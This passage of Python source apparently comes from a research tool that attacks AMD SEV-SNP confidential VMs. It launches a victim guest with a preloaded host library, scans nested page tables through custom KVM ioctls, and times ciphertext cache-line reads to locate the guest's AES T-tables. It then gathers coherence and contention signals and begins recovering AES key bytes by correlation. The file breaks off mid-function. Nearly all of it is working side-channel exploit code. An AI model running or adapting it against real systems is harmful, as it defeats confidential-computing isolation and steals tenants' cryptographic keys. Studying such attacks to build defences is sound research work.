    # Midpoint separates baseline vs trigger contention distribution.
    theta_contention = int(round((b_med + t_med) * 0.5))
    # Tail threshold tracks upper trigger distribution.
    theta_contention_tail = int(percentile_int(trigger_lat, 0.90))
    if theta_contention_tail <= theta_contention:
        theta_contention_tail = theta_contention + max(1, int((t_med - b_med) * 0.25))

    return {
        "theta_contention": int(theta_contention),
        "theta_contention_tail": int(theta_contention_tail),
        "baseline_median": float(b_med),
        "trigger_median": float(t_med),
        "window_start_us": float(window_start_us),
        "window_end_us": float(window_end_us),
    }


def run_cmd(cmd: list[str], cwd: Path, log_path: Path) -> int:
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with log_path.open("w") as fp:
        cp = subprocess.run(cmd, cwd=str(cwd), stdout=fp, stderr=subprocess.STDOUT, check=False)
    return cp.returncode


def resolve_path_with_fallback(default_path: Path, fallback_path: Path) -> Path:
    if default_path.exists():
        return default_path
    if fallback_path.exists():
        return fallback_path
    return default_path


def make_affinity_preexec(cpu: int):
    if cpu < 0:
        return None

    def _fn() -> None:
        os.sched_setaffinity(0, {cpu})

    return _fn


def short_npt_socket_path(vm_dir: Path) -> Path:
    digest = hashlib.sha1(str(vm_dir.resolve()).encode("utf-8")).hexdigest()[:12]
    runtime_dir = Path("/tmp/coh53vm") / digest
    runtime_dir.mkdir(parents=True, exist_ok=True)
    sock_path = runtime_dir / "n.sock"
    try:
        sock_path.unlink()
    except FileNotFoundError:
        pass
    except OSError:
        pass
    return sock_path


def launch_victim_vm(args: argparse.Namespace, vm_dir: Path) -> tuple[subprocess.Popen, Path]:
    vm_dir.mkdir(parents=True, exist_ok=True)
    qemu_bin = resolve_path_with_fallback(
        QEMU_BIN, Path("<COHERE_REPO>/AMDSEV/qemu/build/qemu-system-x86_64")
    )
    ovmf_fd = resolve_path_with_fallback(
        OVMF_FD, Path("<COHERE_REPO>/AMDSEV/ovmf/Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd")
    )
    if not qemu_bin.exists():
        raise SystemExit(f"[env] QEMU binary not found: {qemu_bin}")
    if not ovmf_fd.exists():
        raise SystemExit(f"[env] OVMF not found: {ovmf_fd}")
    if not GUEST_KERNEL.exists():
        raise SystemExit(f"[env] guest kernel missing: {GUEST_KERNEL}")
    if not INITRAMFS.exists():
        raise SystemExit(f"[env] initramfs missing: {INITRAMFS}")

    append_parts = [
        "console=ttyS0",
        "rdinit=/init",
        "panic=-1",
        "quiet",
        "ip=10.0.2.15::10.0.2.2:255.255.255.0::eth0:off",
        "probe_mode=victim_services",
    ]
    if bool(getattr(args, "enable_aes_sync", False)):
        append_parts.append("probe_victim_sync=1")
        append_parts.append(f"probe_victim_sync_port={int(args.aes_sync_port)}")
    extra_cmdline = str(getattr(args, "guest_extra_cmdline", "")).strip()
    if extra_cmdline:
        append_parts.append(extra_cmdline)
    append = " ".join(append_parts)
    npt_sock = short_npt_socket_path(vm_dir)
    sync_log = vm_dir / "debugcon.log"
    preload_env = os.environ.copy()
    preload_env.update(
        {
            "HR_MODE": "nptctl",
            "HR_OUTDIR": str(vm_dir),
            "HR_NPT_SOCK": str(npt_sock),
            "HR_SYNC_LOG": str(sync_log),
            "HR_TID_FILE": str(vm_dir / "hr_thread.tid"),
            "HR_CPU": str(args.qemu_cpu),
            "HR_SYNC_WAIT_TIMEOUT_S": str(
                float(
                    getattr(
                        args,
                        "sync_round_timeout_s",
                        45.0 if int(getattr(args, "resctrl_host_mba", 0)) > 0 else 10.0,
                    )
                )
            ),
            "LD_PRELOAD": str(SRC_DIR / "build" / "libhost_runner.so"),
        }
    )
    (vm_dir / ".hr_preload.lock").unlink(missing_ok=True)

    qemu_cmd = [
        str(qemu_bin),
        "-enable-kvm",
        "-cpu",
        args.cpu_model,
        "-machine",
        "q35,smm=off",
        "-machine",
        "confidential-guest-support=sev0,vmport=off",
        "-machine",
        "memory-backend=ram1",
        "-smp",
        str(args.smp),
        "-m",
        str(args.mem),
        "-no-reboot",
        "-object",
        f"memory-backend-memfd,id=ram1,size={args.mem},share=true,prealloc=false",
        "-object",
        "sev-snp-guest,id=sev0,policy=0x30000,cbitpos=51,reduced-phys-bits=1",
        "-bios",
        str(ovmf_fd),
        "-kernel",
        str(GUEST_KERNEL),
        "-initrd",
        str(INITRAMFS),
        "-append",
        append,
        "-serial",
        f"file:{vm_dir / 'qemu_console.log'}",
        "-chardev",
        f"file,id=debugcon,path={sync_log}",
        "-device",
        "isa-debugcon,iobase=0xe9,chardev=debugcon",
        "-netdev",
        f"user,id=net0,hostfwd=tcp::{args.aes_port}-:9000,hostfwd=tcp::{args.aes_sync_port}-:9002,hostfwd=tcp::{args.rsa_port}-:9001",
        "-device",
        "virtio-net-pci,netdev=net0",
        "-nographic",
    ]

    qlog = (vm_dir / "qemu.log").open("w")
    proc = subprocess.Popen(
        qemu_cmd,
        cwd=str(SRC_DIR),
        env=preload_env,
        stdin=subprocess.DEVNULL,
        stdout=qlog,
        stderr=subprocess.STDOUT,
        preexec_fn=make_affinity_preexec(args.qemu_cpu),
        start_new_session=True,
    )
    return proc, npt_sock


def npt_discovery(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    scan_start_gpa: int,
    scan_end_gpa: int,
    outdir: Path,
) -> list[dict[str, int]]:
    disc_dir = outdir / "discovery"
    disc_dir.mkdir(parents=True, exist_ok=True)
    rounds_csv = disc_dir / "npt_discovery_rounds.csv"
    pages_per_range = max(1, (scan_end_gpa - scan_start_gpa) // PAGE_SZ)
    max_entries = max(512, min(NPTCTL_SCAN_MAX_ENTRIES, pages_per_range))

    trig_hits: dict[int, int] = {}
    base_hits: dict[int, int] = {}

    with rounds_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "round",
                "baseline_pages",
                "trigger_pages",
                "new_pages_after_trigger",
                "clear_pages_scanned",
                "clear_pages_cleared",
            ]
        )
        for r in range(args.discover_rounds):
            clear_ret = ioctl_npt_clear(vm_ctl, scan_start_gpa, scan_end_gpa, flush_tlb=True)
            if clear_ret["ret"] != 0:
                raise RuntimeError(f"NPT clear failed(ret={clear_ret['ret']}) in round={r}")
            time.sleep(args.baseline_wait_ms / 1000.0)
            baseline_ret = ioctl_npt_scan(vm_ctl, scan_start_gpa, scan_end_gpa, max_entries=max_entries)
            if baseline_ret["ret"] != 0:
                raise RuntimeError(f"NPT baseline scan failed(ret={baseline_ret['ret']}) in round={r}")
            baseline_pages = set(int(p) & ~(PAGE_SZ - 1) for p in baseline_ret["pages"])

            clear_ret2 = ioctl_npt_clear(vm_ctl, scan_start_gpa, scan_end_gpa, flush_tlb=True)
            if clear_ret2["ret"] != 0:
                raise RuntimeError(f"NPT clear before trigger failed(ret={clear_ret2['ret']}) in round={r}")
            for _ in range(args.trigger_requests_per_round):
                pt = os.urandom(16)
                _ = aes_request(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)
            trigger_ret = ioctl_npt_scan(vm_ctl, scan_start_gpa, scan_end_gpa, max_entries=max_entries)
            if trigger_ret["ret"] != 0:
                raise RuntimeError(f"NPT trigger scan failed(ret={trigger_ret['ret']}) in round={r}")
            trigger_pages = set(int(p) & ~(PAGE_SZ - 1) for p in trigger_ret["pages"])

            for p in baseline_pages:
                base_hits[p] = base_hits.get(p, 0) + 1
            for p in trigger_pages:
                trig_hits[p] = trig_hits.get(p, 0) + 1

            wr.writerow(
                [
                    r,
                    len(baseline_pages),
                    len(trigger_pages),
                    len(trigger_pages - baseline_pages),
                    clear_ret2["pages_scanned"],
                    clear_ret2["pages_cleared"],
                ]
            )

    ranking: list[dict[str, int]] = []
    all_pages = sorted(set(trig_hits.keys()) | set(base_hits.keys()))
    for p in all_pages:
        t = trig_hits.get(p, 0)
        b = base_hits.get(p, 0)
        score = t - b
        ranking.append(
            {
                "page_gpa": p,
                "trigger_hits": t,
                "baseline_hits": b,
                "score": score,
            }
        )
    ranking.sort(key=lambda it: (it["score"], it["trigger_hits"], -it["baseline_hits"]), reverse=True)

    with (disc_dir / "npt_page_ranking.csv").open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["rank", "page_gpa", "score", "trigger_hits", "baseline_hits"])
        for i, row in enumerate(ranking, start=1):
            wr.writerow([i, f"0x{row['page_gpa']:x}", row["score"], row["trigger_hits"], row["baseline_hits"]])
    write_json(
        disc_dir / "npt_page_ranking.json",
        {"scan_start_gpa": f"0x{scan_start_gpa:x}", "scan_end_gpa": f"0x{scan_end_gpa:x}", "ranking": ranking},
    )
    return ranking


def evaluate_te_base_signal(
    vm_ctl: NptCtlClient,
    te0_gpa: int,
    args: argparse.Namespace,
    reps: int,
) -> dict[str, object]:
    per_line: list[dict[str, float | int]] = []
    total_lines = te_total_lines(te0_gpa)
    for line in range(total_lines):
        h0: list[int] = []
        h1: list[int] = []
        lgpa = line_to_gpa(te0_gpa, line)
        page_gpa = lgpa & ~(PAGE_SZ - 1)
        local_line = (lgpa & (PAGE_SZ - 1)) // LINE_SZ
        line_mask = 1 << local_line
        for _ in range(reps):
            for _ in range(PREHEAT_READS):
                _ = ioctl_read_gpa_tsc(vm_ctl, lgpa)  # preheat host copy
            t0 = ioctl_read_gpa_tsc(vm_ctl, lgpa)
            h0.append(t0)
            pt = os.urandom(16)
            if bool(getattr(args, "enable_aes_sync", False)):
                for _ in range(PREHEAT_READS):
                    _ = ioctl_read_gpa_tsc(vm_ctl, lgpa)
                cycles = sync_aes_measure_mask(
                    vm_ctl,
                    args,
                    page_gpa,
                    pt,
                    KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
                    line_mask,
                    repeats=max(1, int(getattr(args, "aes_sync_phase1_repeats", 1))),
                )
                t1 = int(cycles[local_line])
            else:
                for _ in range(PREHEAT_READS):
                    _ = ioctl_read_gpa_tsc(vm_ctl, lgpa)  # preheat again before trigger
                _ = aes_request(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)
                t1 = ioctl_read_gpa_tsc(vm_ctl, lgpa)
            h1.append(t1)
        h0_mean = robust_center(h0)
        h1_mean = robust_center(h1)
        delta = h1_mean - h0_mean
        adaptive_th = (h0_mean + h1_mean) * 0.5
        p_gt = (sum(1 for x in h1 if float(x) > adaptive_th) / len(h1)) if h1 else 0.0
        per_line.append(
            {
                "line": line,
                "h0_mean": h0_mean,
                "h1_mean": h1_mean,
                "h0_std": statistics.pstdev(h0) if len(h0) > 1 else 0.0,
                "h1_std": statistics.pstdev(h1) if len(h1) > 1 else 0.0,
                "delta_mean": delta,
                "p_gt": p_gt,
            }
        )
    ranked = sorted(per_line, key=lambda it: (float(it["delta_mean"]), float(it["p_gt"])), reverse=True)
    top = ranked[0]
    return {
        "te0_gpa": te0_gpa,
        "page_score": float(top["delta_mean"]),
        "top_line": int(top["line"]),
        "top_line_delta": float(top["delta_mean"]),
        "per_line": per_line,
    }


def select_target_page(
    vm_ctl: NptCtlClient,
    ranking: list[dict[str, int]],
    args: argparse.Namespace,
    outdir: Path,
    te0_inpage_offset: int,
) -> dict[str, int]:
    disc_dir = outdir / "discovery"
    candidates = ranking[: max(1, args.confirm_pages)]
    if not candidates:
        raise RuntimeError("no candidate pages found by NPT discovery")

    rows: list[dict[str, object]] = []
    for c in candidates:
        page = int(c["page_gpa"]) & ~(PAGE_SZ - 1)
        te0_gpa = page + te0_inpage_offset
        ev = evaluate_te_base_signal(vm_ctl, te0_gpa, args, reps=args.confirm_line_reps)
        rows.append(
            {
                "te_page_gpa": page,
                "te0_gpa": te0_gpa,
                "te0_inpage_offset": te0_inpage_offset,
                "npt_score": int(c["score"]),
                "trigger_hits": int(c["trigger_hits"]),
                "baseline_hits": int(c["baseline_hits"]),
                "coherence_score": float(ev["page_score"]),
                "best_line": int(ev["top_line"]),
                "best_line_delta": float(ev["top_line_delta"]),
            }
        )

    rows.sort(
        key=lambda it: (float(it["coherence_score"]), int(it["npt_score"]), int(it["trigger_hits"])),
        reverse=True,
    )
    selected_page = int(rows[0]["te_page_gpa"])
    selected_te0 = int(rows[0]["te0_gpa"])

    with (disc_dir / "candidate_page_confirmation.csv").open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "rank",
                "te_page_gpa",
                "te0_gpa",
                "te0_inpage_offset",
                "coherence_score",
                "best_line",
                "best_line_delta",
                "npt_score",
                "trigger_hits",
                "baseline_hits",
            ]
        )
        for i, r in enumerate(rows, start=1):
            wr.writerow(
                [
                    i,
                    f"0x{int(r['te_page_gpa']):x}",
                    f"0x{int(r['te0_gpa']):x}",
                    f"0x{te0_inpage_offset:x}",
                    f"{float(r['coherence_score']):.6f}",
                    int(r["best_line"]),
                    f"{float(r['best_line_delta']):.6f}",
                    int(r["npt_score"]),
                    int(r["trigger_hits"]),
                    int(r["baseline_hits"]),
                ]
            )

    write_json(
        disc_dir / "selected_target_page.json",
        {
            "selected_te_page_gpa": f"0x{selected_page:x}",
            "selected_te0_gpa": f"0x{selected_te0:x}",
            "te0_inpage_offset": f"0x{te0_inpage_offset:x}",
            "rows": [
                {
                    "te_page_gpa": f"0x{int(r['te_page_gpa']):x}",
                    "te0_gpa": f"0x{int(r['te0_gpa']):x}",
                    "coherence_score": float(r["coherence_score"]),
                    "best_line": int(r["best_line"]),
                    "best_line_delta": float(r["best_line_delta"]),
                    "npt_score": int(r["npt_score"]),
                    "trigger_hits": int(r["trigger_hits"]),
                    "baseline_hits": int(r["baseline_hits"]),
                }
                for r in rows
            ],
        },
    )
    return {
        "te_page_gpa": selected_page,
        "te0_gpa": selected_te0,
    }


def scan_page_lines(vm_ctl: NptCtlClient, te0_gpa: int, args: argparse.Namespace, outdir: Path) -> list[dict[str, float | int]]:
    line_dir = outdir / "line_scan"
    line_dir.mkdir(parents=True, exist_ok=True)
    rows: list[dict[str, float | int]] = []

    total_lines = te_total_lines(te0_gpa)
    line_order = list(range(total_lines))
    random.shuffle(line_order)
    for line in line_order:
        h0: list[int] = []
        h1: list[int] = []
        line_gpa = line_to_gpa(te0_gpa, line)
        hpa_info = ioctl_gpa_to_hpa(vm_ctl, line_gpa)
        line_hpa = int(hpa_info["hpa"])
        page_gpa = line_gpa & ~(PAGE_SZ - 1)
        local_line = (line_gpa & (PAGE_SZ - 1)) // LINE_SZ
        line_mask = 1 << local_line
        for _ in range(args.line_reps):
            for _ in range(PREHEAT_READS):
                _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)  # preheat host copy
            t0 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
            h0.append(t0)
            pt = os.urandom(16)
            if bool(getattr(args, "enable_aes_sync", False)):
                for _ in range(PREHEAT_READS):
                    _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
                cycles = sync_aes_measure_mask(
                    vm_ctl,
                    args,
                    page_gpa,
                    pt,
                    KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
                    line_mask,
                    repeats=max(1, int(getattr(args, "aes_sync_phase1_repeats", 1))),
                )
                t1 = int(cycles[local_line])
            else:
                for _ in range(PREHEAT_READS):
                    _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)  # preheat again before trigger
                _ = aes_request(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)
                t1 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
            h1.append(t1)

        h0_mean = robust_center(h0)
        h1_mean = robust_center(h1)
        h0_std = statistics.pstdev(h0) if len(h0) > 1 else 0.0
        h1_std = statistics.pstdev(h1) if len(h1) > 1 else 0.0
        delta = h1_mean - h0_mean
        adaptive_th = (h0_mean + h1_mean) * 0.5
        p_gt = (sum(1 for x in h1 if float(x) > adaptive_th) / len(h1)) if h1 else 0.0
        mem = line_table_membership(te0_gpa, line)
        primary_table = mem[0] if len(mem) == 1 else -1
        table_local_line = -1
        if primary_table >= 0:
            t_start, _ = table_line_range(te0_gpa, primary_table)
            table_local_line = line - t_start
        rows.append(
            {
                "line": line,
                "table_idx": primary_table,
                "table_local_line": table_local_line,
                "line_gpa": line_gpa,
                "line_hpa": line_hpa,
                "h0_mean": h0_mean,
                "h1_mean": h1_mean,
                "h0_std": h0_std,
                "h1_std": h1_std,
                "delta_mean": delta,
                "p_gt": p_gt,
                "table_membership": ",".join(str(x) for x in mem),
            }
        )

    rows_sorted = sorted(rows, key=lambda it: (float(it["delta_mean"]), float(it["p_gt"])), reverse=True)

    with (line_dir / "line_snr_53.csv").open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "rank",
                "line",
                "table_idx",
                "table_local_line",
                "table_membership",
                "line_gpa",
                "line_hpa",
                "h0_mean",
                "h1_mean",
                "h0_std",
                "h1_std",
                "delta_mean",
                "p_gt",
            ]
        )
        for i, row in enumerate(rows_sorted, start=1):
            wr.writerow(
                [
                    i,
                    int(row["line"]),
                    int(row["table_idx"]),
                    int(row["table_local_line"]),
                    str(row["table_membership"]),
                    f"0x{int(row['line_gpa']):x}",
                    f"0x{int(row['line_hpa']):x}",
                    f"{float(row['h0_mean']):.6f}",
                    f"{float(row['h1_mean']):.6f}",
                    f"{float(row['h0_std']):.6f}",
                    f"{float(row['h1_std']):.6f}",
                    f"{float(row['delta_mean']):.6f}",
                    f"{float(row['p_gt']):.6f}",
                ]
            )

    k_sets, table_ranked = build_table_topk_sets(rows)
    te0_rank = table_ranked.get(0, [])
    if not te0_rank:
        te0_rank = rows_sorted
    te0_best = int(te0_rank[0]["line"])

    write_json(
        line_dir / "topk_lines_53.json",
        {
            "te0_best_line": te0_best,
            "top1": k_sets["top1"],
            "top2": k_sets["top2"],
            "top3": k_sets["top3"],
            "top4": k_sets["top4"],
            "top5": k_sets["top5"],
            "top8": k_sets["top8"],
            "top64": k_sets["top64"],
            "top_all": k_sets["top_all"],
            "table_top5": {
                "table0": [int(r["line"]) for r in table_ranked.get(0, [])[:5]],
                "table1": [int(r["line"]) for r in table_ranked.get(1, [])[:5]],
                "table2": [int(r["line"]) for r in table_ranked.get(2, [])[:5]],
                "table3": [int(r["line"]) for r in table_ranked.get(3, [])[:5]],
            },
        },
    )
    return rows


def generate_controlled_plaintexts(
    target_byte_pos: int | None,
    samples_per_value: int,
    total_samples: int,
    disaligned_mode: bool = False,
    disaligned_samples_per_target: int = 8,
    disaligned_target_entries: list[int] | None = None,
) -> list[bytes]:
    """
    生成固定字节的明文用于Correlation Attack

    如果target_byte_pos不为None，固定该字节位置，遍历256个值
    否则生成完全随机的明文

    Disaligned模式：为每个key候选生成特殊明文，强制访问指定的target entries
    """
    plaintexts = []

    if disaligned_mode and target_byte_pos is not None:
        # Disaligned攻击模式：只为正确密钥生成特殊明文
        if disaligned_target_entries is None:
            disaligned_target_entries = list(range(40, 48))  # 默认entries 40-47

        # 使用TRUE_AES_KEY作为正确密钥
        correct_key = TRUE_AES_KEY[target_byte_pos]

        # 为正确密钥生成特殊明文，使得 pt[target_byte_pos] ^ correct_key ∈ target_entries
        for target_entry in disaligned_target_entries:
            pt_byte_value = target_entry ^ correct_key
            for _ in range(disaligned_samples_per_target):
                pt = bytearray(os.urandom(16))
                pt[target_byte_pos] = pt_byte_value
                plaintexts.append(bytes(pt))

    elif target_byte_pos is None:
        # 随机模式（向后兼容）
        for _ in range(total_samples):
            plaintexts.append(os.urandom(16))
    else:
        # 固定字节模式（Correlation Attack）
        for test_val in range(256):
            for _ in range(samples_per_value):
                pt = bytearray(os.urandom(16))
                pt[target_byte_pos] = test_val
                plaintexts.append(bytes(pt))

    return plaintexts


def collect_observations(
    vm_ctl: NptCtlClient,
    te0_gpa: int,
    args: argparse.Namespace,
    samples: int,
    monitored_lines: list[int],
    phase2_lines: list[int] | None,
    line_thresholds: dict[int, float],
    contention_cfg: dict[str, float | int],
    fusion_mode: str,
    noise_lines: set[int],
    template_pattern_bytes: int,
    out_csv: Path,
    plaintexts: list[bytes] | None = None,
) -> dict[str, object]:
    monitored = sorted(set(monitored_lines))
    phase2_monitored = sorted(set(phase2_lines if phase2_lines else monitored))
    obs: list[dict[str, object]] = []
    dropped_by_hitcount = 0
    attempts = 0
    max_attempts = int(max(samples, samples * max(1.0, float(args.sample_max_attempt_factor))))
    enable_contention = bool(args.enable_contention)
    trigger_reps = max(1, int(args.trigger_repeat_per_sample))

    offset_us = float(contention_cfg.get("offset_us", float(args.contention_offset_us)))
    sigma_us = float(contention_cfg.get("sigma_us", float(args.contention_sigma_us)))
    resolved_theta_contention = int(contention_cfg.get("theta_contention", int(args.theta_contention)))
    resolved_theta_contention_tail = int(contention_cfg.get("theta_contention_tail", int(args.theta_contention_tail)))
    window_half_us = max(float(args.contention_min_window_us), float(args.contention_window_sigma) * max(0.0, sigma_us))
    window_start_us = max(0.0, offset_us - window_half_us)
    window_end_us = max(window_start_us, offset_us + window_half_us)
    phase1_total_hits = 0
    phase2_total_hits = 0
    phase2_tail_total_hits = 0

    # 如果提供了预生成的明文列表，使用它；否则生成随机明文
    if plaintexts is None:
        plaintexts = [os.urandom(16) for _ in range(samples)]

    # 使用提供的明文列表
    plaintext_iter = iter(plaintexts)

    with out_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "attempt_id",
                "sample_id",
                "plaintext_hex",
                "phase1_hit_lines",
                "phase2_hit_lines",
                "phase2_tail_hit_lines",
                "combined_hit_lines",
                "phase1_hit_count",
                "phase2_hit_count",
                "phase2_tail_hit_count",
                "combined_hit_count",
                "table0_part0_count",
                "table0_part1_count",
                "table1_part0_count",
                "table1_part1_count",
                "table2_part0_count",
                "table2_part1_count",
                "table3_part0_count",
                "table3_part1_count",
                "kept",
            ]
        )
        while len(obs) < samples and attempts < max_attempts:
            attempts += 1

            # 使用预生成的明文（如果可用）
            try:
                pt = next(plaintext_iter)
            except StopIteration:
                # 如果明文用完了，生成随机明文
                pt = os.urandom(16)

            # ========== 第1次加密：只测量Coherence (Phase1) ==========
            phase1_hits: list[int] = []
            tsc_map: dict[int, int] = {}
            if bool(getattr(args, "enable_aes_sync", False)):
                phase1_lines = list(range(64)) if args.score_mode == "correlation" else monitored
                for line in monitored:
                    for _ in range(PREHEAT_READS):
                        _ = ioctl_read_gpa_tsc(vm_ctl, line_to_gpa(te0_gpa, line))
                sync_cycles_map = sync_measure_lines_grouped(
                    vm_ctl,
                    args,
                    te0_gpa,
                    pt,
                    KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
                    phase1_lines,
                    repeats=max(1, int(getattr(args, "aes_sync_phase1_repeats", 1))),
                )
                for line in range(64):
                    t = int(sync_cycles_map.get(line, 0))
                    if args.score_mode == "correlation" or line in monitored:
                        tsc_map[line] = t
                    if line in monitored:
                        th = float(line_thresholds.get(line, 0.0))
                        if t > th:
                            phase1_hits.append(line)
            else:
                for line in monitored:
                    for _ in range(PREHEAT_READS):
                        _ = ioctl_read_gpa_tsc(vm_ctl, line_to_gpa(te0_gpa, line))

                for _rep in range(trigger_reps):
                    _ = aes_request(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)

                if args.score_mode == "correlation":
                    for line in range(64):
                        t = ioctl_read_gpa_tsc(vm_ctl, line_to_gpa(te0_gpa, line))
                        tsc_map[line] = int(t)
                        if line in monitored:
                            th = float(line_thresholds.get(line, 0.0))
                            if t > th:
                                phase1_hits.append(line)
                else:
                    for line in monitored:
                        t = ioctl_read_gpa_tsc(vm_ctl, line_to_gpa(te0_gpa, line))
                        if args.score_mode != "binary":
                            tsc_map[line] = int(t)
                        th = float(line_thresholds.get(line, 0.0))
                        if t > th:
                            phase1_hits.append(line)

            # ========== 第2次加密：只测量Contention (Phase2) ==========
            phase2_hits: set[int] = set()
            phase2_tail_hits: set[int] = set()
            phase2_max_lat: dict[int, int] = {}

            if enable_contention:
                # Preheat before second encryption
                for line in phase2_monitored:
                    for _ in range(PREHEAT_READS):
                        _ = ioctl_read_gpa_tsc(vm_ctl, line_to_gpa(te0_gpa, line))
                if bool(getattr(args, "enable_aes_sync", False)):
                    sync_cycles_map = sync_measure_lines_grouped(
                        vm_ctl,
                        args,
                        te0_gpa,
                        pt,
                        KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
                        phase2_monitored,
                        repeats=max(1, int(args.contention_probe_rounds)),
                    )
                    for line in phase2_monitored:
                        t2 = int(sync_cycles_map.get(line, 0))
                        phase2_max_lat[line] = t2
                        if t2 > resolved_theta_contention:
                            phase2_hits.add(line)
                            if t2 > resolved_theta_contention_tail:
                                phase2_tail_hits.add(line)
                else:
                    # 第2次加密同一明文，测量contention
                    for _rep in range(trigger_reps):
                        req = aes_request_async_start(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)
                        start_ns = int(req["start_ns"])
                        deadline_ns = start_ns + int(float(args.sock_timeout_s) * 1_000_000_000)
                        probe_rounds = 0
                        while True:
                            now_ns = time.perf_counter_ns()
                            done = aes_request_async_poll(req)
                            rel_us = (now_ns - start_ns) / 1000.0
                            if (
                                rel_us >= window_start_us
                                and rel_us <= window_end_us
                                and probe_rounds < int(args.contention_probe_rounds)
                            ):
                                for line in phase2_monitored:
                                    t2 = ioctl_read_gpa_tsc(
                                        vm_ctl,
                                        line_to_gpa(te0_gpa, line),
                                        mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
                                    )
                                    prev = phase2_max_lat.get(line, 0)
                                    if int(t2) > prev:
                                        phase2_max_lat[line] = int(t2)
                                    if t2 > resolved_theta_contention:
                                        phase2_hits.add(line)
                                        if t2 > resolved_theta_contention_tail:
                                            phase2_tail_hits.add(line)
                                probe_rounds += 1
                            if done or now_ns >= deadline_ns:
                                break
                            if probe_rounds >= int(args.contention_probe_rounds) and rel_us > window_end_us:
                                if done:
                                    break
                            time.sleep(0.00005)
                        _ = aes_request_async_finish(req)
            if fusion_mode == "phase1_only":
                combined_hits = sorted(set(phase1_hits))
            else:
                combined_hits = sorted(set(phase1_hits) | phase2_hits)

            # 过滤噪声缓存行（固定或用户指定）
            combined_hits = [line for line in combined_hits if line not in noise_lines]
            phase1_hits = [line for line in phase1_hits if line not in noise_lines]
            phase2_hits = [line for line in phase2_hits if line not in noise_lines]
            phase2_tail_hits = [line for line in phase2_tail_hits if line not in noise_lines]

            table_part_counts: dict[int, list[int]] = {0: [0, 0], 1: [0, 0], 2: [0, 0], 3: [0, 0]}
            for line in phase1_hits:
                mem = line_table_membership(te0_gpa, line)
                if len(mem) != 1:
                    continue
                t = mem[0]
                if t < 0 or t >= 4:
                    continue
                part = table_partition_for_line(te0_gpa, line, t, template_pattern_bytes)
                table_part_counts[t][part] += 1

            hit_count = len(combined_hits)
            combined_hit_count = len(combined_hits)
            keep = True
            if int(args.min_hit_lines) > 0 and hit_count < int(args.min_hit_lines):
                keep = False
            if int(args.max_hit_lines) > 0 and hit_count > int(args.max_hit_lines):
                keep = False
            row = {
                "pt": pt,
                # Final evidence follows selected fusion mode.
                "hit_lines": set(combined_hits),
                "phase1_hits": set(phase1_hits),
                "phase2_hits": set(phase2_hits),
                "phase2_tail_hits": set(phase2_tail_hits),
                "table_part_counts": {k: [v[0], v[1]] for k, v in table_part_counts.items()},
            }
            if enable_contention:
                row["phase2_max_lat"] = dict(phase2_max_lat)
            if args.score_mode != "binary":
                row["tsc_map"] = tsc_map
            if keep:
                obs.append(row)
                phase1_total_hits += len(phase1_hits)
                phase2_total_hits += len(phase2_hits)
                phase2_tail_total_hits += len(phase2_tail_hits)
            else:
                dropped_by_hitcount += 1
            wr.writerow(
                [
                    attempts - 1,
                    len(obs) - 1 if keep else -1,
                    pt.hex(),
                    ";".join(str(x) for x in sorted(phase1_hits)),
                    ";".join(str(x) for x in sorted(phase2_hits)),
                    ";".join(str(x) for x in sorted(phase2_tail_hits)),
                    ";".join(str(x) for x in combined_hits),
                    len(phase1_hits),
                    len(phase2_hits),
                    len(phase2_tail_hits),
                    combined_hit_count,
                    table_part_counts[0][0],
                    table_part_counts[0][1],
                    table_part_counts[1][0],
                    table_part_counts[1][1],
                    table_part_counts[2][0],
                    table_part_counts[2][1],
                    table_part_counts[3][0],
                    table_part_counts[3][1],
                    int(keep),
                ]
            )
    return {
        "observations": obs,
        "samples_attempted": attempts,
        "samples_kept": len(obs),
        "dropped_by_hitcount": dropped_by_hitcount,
        "max_attempts": max_attempts,
        "contention_enabled": int(enable_contention),
        "contention_offset_us": float(offset_us),
        "contention_sigma_us": float(sigma_us),
        "contention_window_start_us": float(window_start_us),
        "contention_window_end_us": float(window_end_us),
        "contention_probe_rounds": int(args.contention_probe_rounds),
        "theta_contention": int(resolved_theta_contention),
        "theta_contention_tail": int(resolved_theta_contention_tail),
        "phase1_total_hits": int(phase1_total_hits),
        "phase2_total_hits": int(phase2_total_hits),
        "phase2_tail_total_hits": int(phase2_tail_total_hits),
    }


def recover_one_byte(
    observations: list[dict[str, object]],
    byte_pos: int,
    monitored: set[int],
    te0_gpa: int,
    line_thresholds: dict[int, float],
    fusion_mode: str = "phase1_only",
    score_mode: str = "binary",
    recover_mode: str = "direct",
    template_pattern_bytes: int = DEFAULT_TEMPLATE_PATTERN_BYTES,
    min_valid_count: int = 1,
    phase2_weight: float = 0.25,
    phase2_tail_weight: float = 0.5,
) -> dict[str, object]:
    table_idx = byte_pos % TABLE_COUNT
    pt_idx = byte_pos
    scores: list[dict[str, float | int]] = []

    # Correlation Attack模式：使用模板 Pearson 相关系数
    use_correlation = (score_mode == "correlation")

    for k in range(256):
        hit_count = 0
        valid = 0
        soft_sum = 0.0
        evidence_sum = 0.0
        correlation_sum = 0.0
        corr_x: list[float] = []
        corr_y: list[float] = []

        for ob in observations:
            pt = ob["pt"]
            pred_global = predicted_line_for_key_byte(te0_gpa, byte_pos, int(pt[pt_idx]), k)

            if pred_global not in monitored:
                continue

            # Hybrid Attack: 融合coherence和contention信号
